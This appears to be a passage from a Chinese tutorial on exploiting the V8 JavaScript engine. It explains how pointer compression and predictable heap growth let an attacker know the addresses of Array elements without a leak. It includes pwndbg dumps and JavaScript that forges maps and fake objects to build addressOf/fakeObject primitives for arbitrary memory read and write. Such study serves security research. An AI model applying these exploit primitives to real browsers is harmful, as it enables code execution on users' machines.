
### 现象分析

第一次运行时的输出如下：

```
DebugPrint: 0x54408049941: [JSArray]
DebugPrint: 0x5440804995d: [JSArray]
DebugPrint: 0x5440804996d: [JSArray]
```

第二次运行时的输出如下：

```
DebugPrint: 0x54008049941: [JSArray]
DebugPrint: 0x5400804995d: [JSArray]
DebugPrint: 0x5400804996d: [JSArray]
```

第三次运行时的输出如下：

```
DebugPrint: 0x3b0d08049941: [JSArray]
DebugPrint: 0x3b0d0804995d: [JSArray]
DebugPrint: 0x3b0d0804996d: [JSArray]
```

尽管三次运行，每次打印的地址都不一样，但如果只看其低 32bit 的话，这些地址是完全相同的。在地址压缩的情况下，我们需要写入的地址只需要低 32bit 即可，这意味着，我们不需要任何泄露也能够让 `evil` 指向一块我们希望的地址，因为它们的低位不会因为 ASLR 而改变。

### V8 下的堆喷技术

网上一搜堆喷，首先出来的就是通过跳板指令去滑到 `shellcode`，但那种利用条件以目前的技术来看似乎基本上无法利用了，毕竟它要求堆是可读可写可执行的，才可能往里面插跳板指令，至少在 `v8` 中是不太可能，但通过开辟大内存块来调整内存结构的思路是可以借用的。

一般在 `v8` 的分析文章中常说的堆内存指的是如下这段内存：

```
0x23200000000     0x2320014e000 r-xp 14e000 0      [anon_23200000]
0x2320014e000     0x23200180000 ---p 32000 0      [anon_2320014e]
0x23200180000     0x23200183000 rw-p 3000 0      [anon_23200180]
0x23200183000     0x23200184000 ---p 1000 0      [anon_23200183]
0x23200184000     0x2320019a000 r-xp 16000 0      [anon_23200184]
0x2320019a000     0x232001bf000 ---p 25000 0      [anon_2320019a]
0x232001bf000     0x23208000000 ---p 7e41000 0      [anon_232001bf]
0x23208000000     0x2320802a000 r--p 2a000 0      [anon_23208000]
0x2320802a000     0x23208040000 ---p 16000 0      [anon_2320802a]
0x23208040000     0x2320814d000 rw-p 10d000 0      [anon_23208040]
0x2320814d000     0x23208180000 ---p 33000 0      [anon_2320814d]
0x23208180000     0x23208183000 rw-p 3000 0      [anon_23208180]
0x23208183000     0x232081c0000 ---p 3d000 0      [anon_23208183]
0x232081c0000     0x2320833e000 rw-p 17e000 0      [anon_232081c0]
0x2320833e000     0x23300000000 ---p f7cc2000 0      [anon_2320833e]
```

其中，以 `0x2320833e000` 地址开始的这段是尚未分配的内存区，而以 `0x232081c0000` 地址开始的则是刚刚分配出来的堆内存。

并且可以注意到，这一大段内存都是地址连续的，因此我们可以通过开辟足够大的内存块来让某个地址处的内存能够读写，并且这个地址是我们已知的。那么问题就变成了，具体应该开辟多大的内存区？

对比一下堆空间和网上能够找到的资料，笔者用一段简单的测试代码说明：

```
%SystemBreak();

arr = Array(0xf700);
arr[0]=1;
%DebugPrint(arr);
%SystemBreak();

arr = Array(0xf700);
arr[0]=2;
%DebugPrint(arr);
%SystemBreak();
```

运行结果：

```
0x2f43081c0000    0x2f4308240000 rw-p 80000 0      [anon_2f43081c0] // 第一个断点
0x2f4308240000    0x2f4400000000 ---p f7dc0000 0      [anon_2f4308240]

0x2f43081c0000    0x2f4308280000 rw-p    c0000 0      [anon_2f43081c0] // 第二个断点
0x2f4308280000    0x2f4400000000 ---p f7d80000 0      [anon_2f4308280]

0x2f43081c0000    0x2f43082c0000 rw-p 100000 0      [anon_2f43081c0] // 第三个断点
0x2f43082c0000    0x2f4400000000 ---p f7d40000 0      [anon_2f43082c0]
```

似乎堆结构在以有规律的增长，接下来实际看一下内存中的状况：

```
pwndbg> x/10gx 0x2f43081c0000
0x2f43081c0000: 0x0000000000040000    0x0000000000000004
0x2f43081c0010: 0x000055775c5d9e68    0x00002f43081c2118
0x2f43081c0020: 0x00002f4308200000    0x000000000003dee8
0x2f43081c0030: 0x0000000000000000    0x0000000000002118
0x2f43081c0040: 0x000055775c65c210    0x000055775c5cbeb0

pwndbg> x/10gx 0x2f43081c0000+0x40000
0x2f4308200000: 0x0000000000040000    0x0000000000000004
0x2f4308200010: 0x000055775c5d9e68    0x00002f4308202118
0x2f4308200020: 0x00002f4308240000    0x000000000003dee8
0x2f4308200030: 0x0000000000000000    0x0000000000002118
0x2f4308200040: 0x000055775c65c870    0x000055775c5cbeb0

pwndbg> x/10gx 0x2f43081c0000+0x40000+0x40000
0x2f4308240000: 0x0000000000040000    0x0000000000000032
0x2f4308240010: 0x000055775c5d9e68    0x00002f4308242118
0x2f4308240020: 0x00002f430827fd20    0x000000000003dc08
0x2f4308240030: 0x0000000000000000    0x0000000000002118
0x2f4308240040: 0x000055775c65cd50    0x000055775c5cbeb0
```

我们按照每次增长的地址空间大小去跟踪内存，发现它们存在一定的规律，对照一些资料能够大概得到这样的结论：

> `0x2f43081c0000`：内存块的大小

> `0x2f43081c0018`：内存块可用空间的起始地址

> `0x2f43081c0020`：表示下一个内存块的地址

> `0x2f43081c0008`：已被使用的内存大小(`0x3dee8+0x2118=0x40000`)

> `0x2f43081c0038`：元数据的占用大小

再对比一下打印出来的数据信息：

```
pwndbg> job 0x2f430804999d
- elements: 0x2f4308242119 <FixedArray[63232]> [HOLEY_SMI_ELEMENTS]
- length: 63232
- properties: 0x2f430800222d <FixedArray[0]>
}
- elements: 0x2f4308242119 <FixedArray[63232]> {
0: 1
1-63231: 0x2f430800242d <the_hole>
}

pwndbg> job 0x2f43080499ad
- elements: 0x2f4308282119 <FixedArray[63232]> [HOLEY_SMI_ELEMENTS]
- length: 63232
- properties: 0x2f430800222d <FixedArray[0]>
}
- elements: 0x2f4308282119 <FixedArray[63232]> {
0: 2
1-63231: 0x2f430800242d <the_hole>
}
```

可以发现，两个 `Array` 的储存数据地址 `elements` 都从 `0x2119+自身堆地址` 处开始，顺序储存，这意味着我们能够通过固定的低位偏移得到这两个数据的地址信息，因此甚至不需要泄露地址也能够获取 `elements` 的地址。

这种思路和传统的堆喷有些差别，因为它是通过开辟内存空间使得固定地址的内存可读写，而传统堆喷则是通过开辟大内存使得随机访问能够命中。

### 利用思路

既然我们能够知道 `Array` 对象的 `elements` 成员地址，就能够向其中伪造数据数据，将伪造的内容装成一个对象，从而实现 `addressOf` 和 `fakeObject`，进而完成任意地址读写。

首先，我们令 `evil` 指向一个新 `Array` 的 `elements` 中的 `value`，然后在这个 `Array` 中布置数据进行伪造：

```
···
for (let i = 0x0; i < 0x11; i++) {
    obj_prop_ut_fake['x' + i] = u2d(0x082c2121, 0);
}
···
var demo_array= new Array(0xf000);
demo_ele_addr=0x82c2120;
fake_buf=demo_ele_addr+0x200+8;
array_map0 = itof(0x1604040408002119n);

double_array_map_addr=demo_ele_addr+0x100;
double_array_map_value=itof(0x0a0007ff11000834n);

demo_array[0x100/8]=array_map0;
demo_array[0x108/8]=double_array_map_value;

obj_array_map_addr=demo_ele_addr+0x150;
obj_array_map_value=itof(0x0a0007ff09000834n);

demo_array[0x150/8]=array_map0;
demo_array[0x158/8]=obj_array_map_value;

demo_array[0x000/8]=u2d(obj_array_map_addr+1,0);
demo_array[0x008/8]=u2d(fake_buf+1,0x2);
```

其中值得一提的是，`map` 的伪造过程：

```
demo_ele_addr=0x82c2120;
fake_buf=demo_ele_addr+0x200+8;

array_map0 = itof(0x1604040408002119n);
obj_array_map_value=itof(0x0a0007ff09000834n);
obj_array_map_addr=demo_ele_addr+0x150;

demo_array[0x150/8]=array_map0;
demo_array[0x158/8]=obj_array_map_value;

demo_array[0x000/8]=u2d(obj_array_map_addr+1,0);
demo_array[0x008/8]=u2d(fake_buf+1,0x2);
```

我们的伪造目标地址是 `&demo_array[0]`，上面的代码和 C 的等价伪代码为：

```
*(demo_array) = obj_array_map_addr+1;
*(demo_array+4) = 0;
*(demo_array+8) = fake_buf+1;
*(demo_array+12) = 2;

*(obj_array_map_addr) = 0x0a0007ff09000834;
```

这种操作是合法的，我们可以发现，`obj_array_map_addr` 的值是已知的，其值是笔者随意声明一个对象数组后在其 `map` 地址处实际拷贝出来的值，也就是说，`map` 值本身是固定的，和地址无关的，只需要让指针指向该值，就会正常将其识别为对应的类型。
